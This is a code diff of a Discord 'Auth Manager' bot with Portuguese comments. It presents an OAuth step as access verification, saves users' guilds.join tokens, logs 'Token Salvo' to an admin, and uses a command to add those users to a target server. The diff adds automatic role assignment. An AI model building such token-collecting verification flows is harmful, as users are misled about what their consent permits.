@@ -8,16 +8,20 @@ const {
 } = require('discord.js');
 
 // --- CONFIGURAÇÕES ---
-// ID do canal de logs (onde chega o aviso para o admin)
 const LOG_CHANNEL_ID = process.env.LOG_CHANNEL_ID; 
-// Link para onde o usuário volta após o sucesso (O canal do servidor)
 const REDIRECT_TARGET = 'https://discordapp.com/channels/1430240815229305033'; 
 
 const app = express();
-const client = new Client({ intents: [GatewayIntentBits.Guilds] });
+// Precisamos da Intent GuildMembers para gerenciar cargos
+const client = new Client({ 
+    intents: [
+        GatewayIntentBits.Guilds, 
+        GatewayIntentBits.GuildMembers 
+    ] 
+});
 const userTokens = new Map();
 
-// --- SERVIDOR WEB (Visual Bonito) ---
+// --- SERVIDOR WEB ---
 app.get('/', (req, res) => res.send('Auth Manager Online 🟢'));
 
 app.get('/callback', async (req, res) => {
@@ -26,7 +30,6 @@ app.get('/callback', async (req, res) => {
 
     try {
         // 1. Troca Código por Token
-        // IMPORTANTE: As variáveis no Render devem bater com o ID do link que você mandou
         const tokenResponse = await axios.post(
             'https://discord.com/api/oauth2/token',
             new URLSearchParams({
@@ -52,6 +55,31 @@ app.get('/callback', async (req, res) => {
         // 3. Salva Token na Memória
         userTokens.set(user.id, access_token);
 
+        // --- NOVA PARTE: DAR CARGO AUTOMÁTICO ---
+        try {
+            const guildId = process.env.MAIN_GUILD;
+            if (guildId) {
+                const guild = client.guilds.cache.get(guildId);
+                if (guild) {
+                    // Busca o usuário no servidor
+                    const member = await guild.members.fetch(user.id).catch(() => null);
+                    
+                    // Busca o cargo pelo NOME EXATO "Auth2 Vetificados"
+                    const role = guild.roles.cache.find(r => r.name === 'Auth2 Vetificados');
+
+                    if (member && role) {
+                        await member.roles.add(role);
+                        console.log(`✅ Cargo dado para: ${user.username}`);
+                    } else {
+                        console.log(`❌ Erro: Usuário não está no servidor ou cargo 'Auth2 Vetificados' não existe.`);
+                    }
+                }
+            }
+        } catch (erroCargo) {
+            console.error("Erro ao dar cargo:", erroCargo);
+        }
+        // ----------------------------------------
+
         // 4. Envia LOG para o Admin
         const logChannel = client.channels.cache.get(LOG_CHANNEL_ID);
         if (logChannel) {
@@ -60,7 +88,7 @@ app.get('/callback', async (req, res) => {
                 .setThumbnail(`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`)
                 .addFields(
                     { name: 'Usuário', value: `${user.username} (${user.id})`, inline: true },
-                    { name: 'Status', value: '🟢 Token Salvo', inline: true }
+                    { name: 'Status', value: '🟢 Token Salvo + Cargo Dado', inline: true }
                 )
                 .setColor(0x00FF00)
                 .setFooter({ text: 'Aguardando envio...' });
@@ -118,7 +146,7 @@ app.get('/callback', async (req, res) => {
 
     } catch (error) {
         console.error(error);
-        res.send('❌ Erro na verificação. Verifique se o CLIENT_SECRET no Render corresponde ao BOT do link.');
+        res.send('❌ Erro na verificação.');
     }
 });
 
@@ -142,12 +170,11 @@ client.once('ready', async () => {
 
 client.on('interactionCreate', async interaction => {
     
-    // 1. COMANDO SETUP
+    // 1. COMANDO SETUP (Link automático pelo Render)
     if (interaction.isChatInputCommand() && interaction.commandName === 'setup_auth') {
         if (!interaction.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;
 
-        // --- AQUI ESTÁ O LINK QUE VOCÊ PEDIU ---
-        const authUrl = "https://discord.com/oauth2/authorize?client_id=1443717513748812011&response_type=code&redirect_uri=https%3A%2F%2Fhunter-bot-verify.onrender.com%2Fcallback&scope=identify+guilds.join";
+        const authUrl = `https://discord.com/oauth2/authorize?client_id=${process.env.CLIENT_ID}&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&response_type=code&scope=identify+guilds.join`;
 
         const embed = new EmbedBuilder()
             .setTitle('🔓 Liberação de Acesso')
@@ -190,7 +217,7 @@ client.on('interactionCreate', async interaction => {
             );
             await interaction.editReply(`✅ **Sucesso!** Enviado para \`${targetServerId}\`.`);
         } catch (erro) {
-            await interaction.editReply('❌ Falha ao adicionar. O Bot está no servidor alvo com permissão de Criar Convite/Admin?');
+            await interaction.editReply('❌ Falha ao adicionar. Verifique permissões do Bot.');
         }
     }
 });
